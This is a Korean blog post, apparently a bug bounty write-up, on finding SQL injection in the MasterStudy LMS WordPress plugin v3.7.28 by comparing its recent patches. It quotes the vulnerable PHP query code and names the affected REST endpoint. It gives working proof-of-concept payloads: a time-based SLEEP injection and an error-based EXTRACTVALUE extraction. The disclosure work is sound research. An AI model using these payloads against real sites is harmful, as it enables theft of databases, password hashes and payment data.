---
layout: post
title: "[BugBounty] MasterStudy LMS SQL Injection 취약점 발견 — CVE 제출 과정"
date: 2026-04-24
category: 웹
author: yejunkim2000
tags: [BugBounty, SQLi, WordPress, Patchstack, CVE, LMS]
---

> **플러그인:** masterstudy-lms-learning-management-system v3.7.28
> **플랫폼:** Patchstack Bug Bounty
> **발견일:** 2026-04-24

---

## 결과 요약

| 항목 | 내용 |
|------|------|
| **취약점 유형** | SQL Injection (Time-based Blind / Error-based) |
| **영향 버전** | MasterStudy LMS v3.7.28 (최신 버전) |
| **엔드포인트** | `POST /wp-json/lms/stm-lms/order/items` |
| **필요 권한** | Subscriber+ (일반 로그인 사용자) |
| **CVSS** | 6.5 (Medium) — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |

---

## 1. 타겟 선정

Patchstack 버그바운티 프로그램에 제출할 취약점을 찾기 위해 WordPress 플러그인을 분석했다. 타겟 선정 기준은 아래와 같다.

- 설치 수 10,000 이상 (충분한 영향 범위)
- 최근 CVE가 존재하지만 완전히 패치되지 않았을 가능성
- 결제/수강 등 복잡한 기능을 가진 LMS/예약 플러그인

**MasterStudy LMS** (10,000+ 설치)가 이 조건에 부합했다. Patchstack DB를 확인하니 6일 전(2026-04-17) `orderby`/`order` 파라미터 SQL 인젝션이 v3.7.26에서 패치된 이력이 있었다.

---

## 2. 분석 전략 — Variant Analysis

개발자가 특정 파라미터의 취약점을 패치할 때, 같은 함수 내의 다른 파라미터는 미처 패치하지 못하는 경우가 많다.

**최근 패치 이력:**

| 버전 | 패치 내용 |
|------|-----------|
| v3.7.26 | `orderby`, `order` 파라미터 SQL 인젝션 패치 |
| v3.7.27 | `date` 파라미터 SQL 인젝션 패치 |

**전략:** 패치된 파라미터와 같은 함수 내에서 아직 패치되지 않은 파라미터를 찾는다.

---

## 3. 코드 분석 과정

### Step 1 — REST API 엔드포인트 확인

WordPress SVN에서 플러그인 코드를 직접 분석했다.
`_core/lms/route.php`에서 REST API 등록 코드를 발견했다.

```php
register_rest_route('lms', '/stm-lms/order/items', array(
    'methods'             => 'POST',
    'callback'            => array('StmStatistics', 'get_user_orders_api'),
    'permission_callback' => 'is_user_logged_in',  // ← Subscriber+만 있으면 접근 가능
));
```

권한 체크가 `is_user_logged_in()`만 사용하고 있다. `manage_options` 같은 관리자 권한 체크가 없다.

---

### Step 2 — 핸들러 함수 분석

`StmStatistics.php`의 `get_user_orders_api()`를 확인했다.

```php
public static function get_user_orders_api() {
    check_ajax_referer( 'wp_rest', 'nonce' );

    $params = $_POST;   // ← $_POST 전체를 검증 없이 $params에 할당

    if ( ! empty( $params['author_id'] ) ) {
        $params['author_id'] = (int) $params['author_id'];
        return self::get_user_order_items( $offset, $limit, $params );
    }
}
```

`$params = $_POST` 한 줄이 결정적이다. POST 바디 전체가 검증 없이 다음 함수로 전달된다.

---

### Step 3 — SQL 쿼리 빌더 분석

`get_user_order_items()` 함수 내부에서 `where_raw()` 호출을 확인했다.

```php
// status 파라미터
if ( ! empty( $params['status'] ) ) {
    $query->where_raw(
        ' ( meta.meta_key = "status" AND meta.meta_value = "'
        . $params['status'] .    // ← 직접 삽입. prepare() 없음
        '" ) OR ( _order.post_status = "'
        . $params['status'] .    // ← 두 번 삽입
        '" ) '
    );
}

// total_price 파라미터
if ( ! empty( $params['total_price'] ) ) {
    $query->where_raw(
        ' ( meta.meta_key = "_order_total" AND meta.meta_value = "'
        . $params['total_price'] .    // ← 직접 삽입
        '" ) '
    );
}

// user 파라미터
$ids = array( $params['user'] );
$query->where_raw(
    ' meta.meta_value in (' . implode( ',', $ids ) . ') '  // ← 직접 삽입
);
```

---

### Step 4 — 패치된 코드와 비교

v3.7.26에서 `orderby`, `order`는 아래처럼 whitelist 방식으로 패치됐다.

```php
private static function normalize_order_direction( $order ) {
    $order = strtoupper( trim( sanitize_text_field( $order ) ) );
    return in_array( $order, array( 'ASC', 'DESC' ), true ) ? $order : 'ASC';
}

private static function normalize_orderby( $orderby, $allowed_columns, $default ) {
    $orderby = sanitize_key( $orderby );
    return $allowed_columns[ $orderby ] ?? $default;
}
```

이 whitelist 검증 방식이 `status`, `total_price`, `user`에는 적용되지 않았다.

---

## 4. 취약점 확인

### 파라미터별 검증 현황

| 파라미터 | 검증 방식 | 취약 여부 |
|----------|-----------|-----------|
| `order` | whitelist | 패치됨 (v3.7.26) |
| `orderby` | `sanitize_key` | 패치됨 (v3.7.26) |
| `date` | 부분 처리 | 패치됨 (v3.7.27) |
| `status` | **없음** | **취약 (현재)** |
| `total_price` | **없음** | **취약 (현재)** |
| `user` | **없음 (implode)** | **취약 (현재)** |

---

### PoC 페이로드

**`status` 파라미터:**

```
" OR SLEEP(5) OR "
```

**생성되는 SQL:**

```sql
( meta.meta_key = "status" AND meta.meta_value = "" OR SLEEP(5) OR "" )
OR
( _order.post_status = "" OR SLEEP(5) OR "" )
```

`SLEEP(5)`가 2회 실행되어 약 10초 응답 지연이 발생한다.

**Error-based 추출 페이로드:**

```
" AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e)) OR "
```

---

## 5. 영향 범위

이 취약점을 통해 공격자가 할 수 있는 것들이다.

- 데이터베이스 전체 내용 탈취
- 관리자 비밀번호 해시 추출
- 모든 학생의 수강 기록 및 결제 정보 열람
- WordPress 시크릿 키 추출 → 인증 쿠키 위조

---

## 6. 제출 및 느낀 점

- **플랫폼:** Patchstack Bug Bounty
- **제출일:** 2026-04-24

이번 발견의 핵심은 **Variant Analysis**였다. 패치 이력을 먼저 파악하고, 같은 함수 내에서 패치되지 않은 파라미터를 찾는 접근 방식이 매우 효과적이었다.

개발자가 특정 파라미터를 패치할 때 같은 함수 내의 다른 파라미터까지 일괄 검토하지 않는 경우가 생각보다 많다. 최근 패치 이력을 분석하는 것만으로도 새로운 취약점을 찾을 수 있는 출발점이 된다.
